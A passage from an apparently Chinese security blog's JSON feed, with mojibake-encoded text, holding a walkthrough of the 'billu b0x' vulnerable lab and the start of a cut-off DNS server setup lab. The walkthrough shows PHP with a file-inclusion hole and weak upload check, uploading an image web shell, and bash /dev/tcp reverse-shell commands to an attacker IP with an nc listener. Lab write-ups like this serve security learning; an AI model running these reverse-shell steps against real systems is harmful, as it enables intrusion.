punctuation\">&#123;</span>\n\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: index.php'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Welcome to billu b0x \"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form method=post style=\"margin: 10px 0px 10px 95%;\">&lt;input type=submit name=lg value=Logout>&lt;/form>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'lg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'logged'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: index.php'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;hr>&lt;br>'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form method=post>\n\n&lt;select name=load>\n    &lt;option value=\"show\">Show Users&lt;/option>\n\t&lt;option value=\"add\">Add User&lt;/option>\n&lt;/select> \n\n &amp;nbsp&lt;input type=submit name=continue value=\"continue\">&lt;/form>&lt;br>&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'continue'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$choice</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$choice</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'add'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n       \t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$choice</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$choice</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'show'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n        \n\t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$choice</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\n\t<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$address</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'address'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$iname</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$r</span><span class=\"token operator\">=</span><span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$image</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpeg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$finfo</span> <span class=\"token operator\">=</span> @<span class=\"token keyword\">new</span> <span class=\"token class-name\">finfo</span><span class=\"token punctuation\">(</span><span class=\"token constant\">FILEINFO_MIME</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\t<span class=\"token variable\">$filetype</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$finfo</span><span class=\"token operator\">-></span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/jpeg/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span>  <span class=\"token operator\">||</span> <span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/png/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/gif/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'uploaded_images/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t\t\t <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t\t\t  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Uploaded successfully \"</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t  <span class=\"token variable\">$update</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'insert into users(name,address,image,id) values(\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\',\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$address</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\',\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$iname</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\', \\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\')'</span><span class=\"token punctuation\">;</span> \n\t\t\t\t\t\t\t <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$update</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t  \n\t\t\t\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">else</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>i told you dear, only png,jpg and gif file are allowed\"</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>only png,jpg and gif file are allowed\"</span><span class=\"token punctuation\">;</span>\n\t\t\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é€šè¿‡æ–‡ä»¶è¯»å–è·å– panel çš„æºç </p>\n<p>æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†ä»…å…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œä½†æ˜¯ä»…ç®€å•åˆ¤æ–­åç¼€åï¼Œå°è¯•ä¸Šä¼ å›¾ç‰‡é©¬æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726103940791.png\" alt=\"image-20220726103940791\" /></p>\n<p>ä¸Šä¼ å›¾ç‰‡é©¬</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726103923536.png\" alt=\"image-20220726103923536\" /></p>\n<p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œå‘½ä»¤</p>\n<p>åå¼¹ shell kali å‘½ä»¤è¡Œé‡Œè¾“å…¥ nc -lvnp 6666 å¼€å§‹ç›‘å¬ï¼ŒåŒæ—¶ burp çš„ post è¯·æ±‚ä¸­æ‰§è¡Œ echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.161.143/6666 0&gt;&amp;1&quot; | bashï¼Œæ³¨æ„è¦å°†æ­¤å‘½ä»¤å…ˆç»è¿‡ URL ç¼–ç æ‰èƒ½å‘é€ (è¿™ä¸ª ip æ˜¯æ”»å‡»æœºçš„ IP åœ°å€)</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726110853078.png\" alt=\"image-20220726110853078\" /></p>\n<p>è¿æ¥æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726111050889.png\" alt=\"image-20220726111050889\" /></p>\n<p>ææƒæ˜¾ç¤ºéœ€è¦ç»ˆç«¯ï¼Œè¾“å…¥å‘½ä»¤ python -c 'import pty;pty.spawn (&quot;/bin/bash&quot;)'</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726111155443.png\" alt=\"image-20220726111155443\" /></p>\n<p>python -c 'import pty;pty.spawn (&quot;/bin/bash&quot;)' è§£é‡Š</p>\n<p>å½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ª webshell çš„æ—¶å€™ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œä½†æ˜¯è¿™äº›å‘½ä»¤éƒ½æ˜¯éäº¤äº’çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å­˜åœ¨ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚å½“æˆ‘ä»¬æƒ³ä½¿ç”¨ vimã€top ç­‰å‘½ä»¤æ—¶ï¼Œwebshell å°±æ— èƒ½ä¸ºåŠ›äº†ã€‚</p>\n<p>ä¸€èˆ¬æˆ‘ä»¬éƒ½ä¼šä½¿ç”¨ nc æ¥æ¥æ”¶åå¼¹æ¥çš„ shellï¼Œåªéœ€è¦åœ¨ç›®æ ‡ä¸Š (ä»¥ linux ä¸ºä¾‹) æ‰§è¡Œï¼š</p>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/192.168.2.134/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>æœ¬åœ°æ¥æ”¶ä¸€ä¸‹å°± ok äº†ï¼Œä½†æ˜¯åå¼¹å›æ¥çš„ shellï¼Œæˆ–å¤šæˆ–å°‘éƒ½ä¼šå­˜åœ¨é—®é¢˜ï¼Œæ¯”å¦‚å½“æˆ‘æƒ³ä½¿ç”¨ top å‘½ä»¤æ—¶å°±ä¼šæç¤ºæ²¡æœ‰  <code>tty</code> ã€‚ç®€å•çš„æ¥è¯´å°±æ˜¯æ²¡æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè¿™æ ·çš„è¯ï¼Œ <code>vim</code> ï¼Œ <code>sudo</code>  ç­‰æ“ä½œéƒ½åšä¸äº†ï¼Œæœ‰æ—¶å€™è¿˜éœ€è¦å…¶ä»–å·¥å…·ï¼Œå¾ˆéº»çƒ¦ã€‚</p>\n<p>æº¢å‡ºææƒ</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python <span class=\"token operator\">-</span>c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>æ¥å¾—åˆ°äº¤äº’çš„ Shell, ä¸€èˆ¬çš„ç³»ç»Ÿéƒ½é»˜è®¤å®‰è£… python</p>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "æ¸—é€æµ‹è¯•"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/",
            "url": "https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/",
            "title": "DNSæœåŠ¡å™¨",
            "date_published": "2022-11-02T16:00:00.000Z",
            "content_html": "<h2 id=\"å®éªŒ3dnsæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#å®éªŒ3dnsæœåŠ¡å™¨é…ç½®\">#</a> å®éªŒ 3ï¼šDNS æœåŠ¡å™¨é…ç½®</h2>\n<p><strong>å®éªŒç›®çš„</strong></p>\n<blockquote>\n<p>1ã€äº†è§£ DNS åŸºæœ¬æ¦‚å¿µåŠåŸŸåè§£æè¿‡ç¨‹ï¼›</p>\n<p>2ã€ç†Ÿæ‚‰å¸¸è§„ DNS æœåŠ¡å™¨çš„å®‰è£…ä¸é…ç½®ï¼›</p>\n<p>3ã€æŒæ¡è¾…åŠ© DNS æœåŠ¡å™¨çš„é…ç½®ï¼›</p>\n<p>4ã€æŒæ¡ DNS æœåŠ¡å™¨é…ç½®è¿‡ç¨‹ä¸­ä¸€èˆ¬æ’é”™æ–¹æ³•ã€‚</p>\n</blockquote>\n<p><strong>å®éªŒå‚è€ƒ</strong></p>\n<blockquote>\n<p>å®éªŒæ­¥éª¤å¯å‚è€ƒã€Š5-1 - ä¸» dns æœåŠ¡å™¨é…ç½®.pdfã€‹æ–‡ä»¶ã€‚</p>\n<p>å®éªŒæ­¥éª¤å¯å‚è€ƒã€Š5-2 - è¾…åŠ© DNS æœåŠ¡å™¨é…ç½®.pdfã€‹æ–‡ä»¶ã€‚</p>\n</blockquote>\n<h3 id=\"1å®éªŒè¦æ±‚\"><a class=\"anchor\" href=\"#1å®éªŒè¦æ±‚\">#</a> 1. å®éªŒè¦æ±‚</h3>\n<blockquote>\n<p>ä»»åŠ¡ 1ï¼šä¸» DNS æœåŠ¡å™¨é…ç½®</p>\n<p>ä»»åŠ¡ 2ï¼šè¾…åŠ© DNS æœåŠ¡å™¨é…ç½®</p>\n<p>è¦æ±‚ï¼š<span class=\"exturl\" data-url=\"aHR0cDovL3huLS14eHgtYzg4ZDg5eHc2Zi5jbw==\">åŸŸåä¸º xxx.co</span>ï¼Œå…¶ä¸­ xxx ä¸ºå§“åæ‹¼éŸ³æ‹¼å†™ã€‚</p>\n</blockquote>\n<h3 id=\"2å®éªŒè¿‡ç¨‹\"><a class=\"anchor\" href=\"#2å®éªŒè¿‡ç¨‹\">#</a> 2. å®éªŒè¿‡ç¨‹</h3>\n<h4 id=\"21-ä¸»dnsæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#21-ä¸»dnsæœåŠ¡å™¨é…ç½®\">#</a> 2.1 ä¸» DNS æœåŠ¡å™¨é…ç½®</h4>\n<h5 id=\"211-ç¯å¢ƒå‡†å¤‡\"><a class=\"anchor\" href=\"#211-ç¯å¢ƒå‡†å¤‡\">#</a> 2.1.1 ç¯å¢ƒå‡†å¤‡</h5>\n<p>å®‰è£…æœåŠ¡è½¯ä»¶åŒ…</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\"># yum install -y bind bind-chroot bind-utils<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103144721267.png\" alt=\"image-20221103144721267\" /></p>\n<h5 id=\"212-ä¿®æ”¹4ä¸ªé…ç½®æ–‡ä»¶\"><a class=\"anchor\" href=\"#212-ä¿®æ”¹4ä¸ªé…ç½®æ–‡ä»¶\">#</a> 2.1.2 ä¿®æ”¹ 4 ä¸ªé…ç½®æ–‡ä»¶</h5>\n<ol>\n<li>\n<p>ä¿®æ”¹ä¸»é…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ›´æ”¹ä¸‰ä¸ªä½ç½®å¦‚ä¸‹å›¾</p>\n<p>å¼€å¤´ä½ç½®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145538563.png\" alt=\"image-20221103145538563\" /></p>\n<p>ç»“å°¾ä½ç½®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145737581.png\" alt=\"image-20221103145737581\" /></p>\n</li>\n<li>\n<p>ä¿®æ”¹åŒºåŸŸé…ç½®æ–‡ä»¶ï¼ˆå¤åˆ¶åŸæœ‰çš„æ ·æœ¬æ–‡ä»¶ï¼‰</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;etc&#x2F;named.rfc1912.zones &#x2F;etc&#x2F;named.lq.zone\n#è¿™é‡Œ-pæ˜¯ä¸ºäº†ä¿æŒæƒé™ä¸€è‡´<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103150314623.png\" alt=\"image-20221103150314623\" /></p>\n<p>ä¿®æ”¹åŒºåŸŸæ–‡ä»¶ï¼Œä¿ç•™æ­£å‘åŒºåŸŸå’Œåå‘åŒºåŸŸå¼•å…¥éƒ¨åˆ†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103151036445.png\" alt=\"image-20221103151036445\" /></p>\n</li>\n<li>\n<p>ä¿®æ”¹æ­£å‘è§£ææ–‡ä»¶ï¼ˆè®°å½•åŸŸåå’Œ ip åœ°å€çš„å¯¹åº”å…³ç³»ï¼‰</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;named.lq.co<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152432683.png\" alt=\"image-20221103152432683\" /></p>\n<p>ä¿®æ”¹è§£ææ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153833142.png\" alt=\"image-20221103153833142\" /></p>\n</li>\n<li>\n<p>ä¿®æ”¹åå‘è§£ææ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;named.lq.loopback<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152946305.png\" alt=\"image-20221103152946305\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153720430.png\" alt=\"image-20221103153720430\" /></p>\n</li>\n</ol>\n<p>å¼€å¯æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103154120053.png\" alt=\"image-20221103154120053\" /></p>\n<h5 id=\"213æµ‹è¯•\"><a class=\"anchor\" href=\"#213æµ‹è¯•\">#</a> 2.1.3 æµ‹è¯•</h5>\n<p>å…ˆåœ¨æµ‹è¯•æœºå®‰è£…å·¥å…·åŒ…</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#sudo yum install -y bind-utils<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103160707160.png\" alt=\"image-20221103160707160\" /></p>\n<p>ä¿®æ”¹é™æ€ DNS</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161100819.png\" alt=\"image-20221103161100819\" /></p>\n<p>è¿›å…¥ nslookup çš„äº¤äº’æ¨¡å¼</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161253757.png\" alt=\"image-20221103161253757\" /></p>\n<p>è¶…æ—¶æŠ¥é”™ï¼Œæµ‹è¯•å¯»æ‰¾é—®é¢˜</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161404203.png\" alt=\"image-20221103161404203\" /></p>\n<p>æµ‹è¯•ä¸»æœºå¯è¾¾ï¼Œæµ‹è¯•é˜²ç«å¢™çš„é—®é¢˜</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161505377.png\" alt=\"image-20221103161505377\" /></p>\n<p>å…³é—­é˜²ç«å¢™ï¼Œèƒ½æ­£å¸¸è§£æ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161646400.png\" alt=\"image-20221103161646400\" 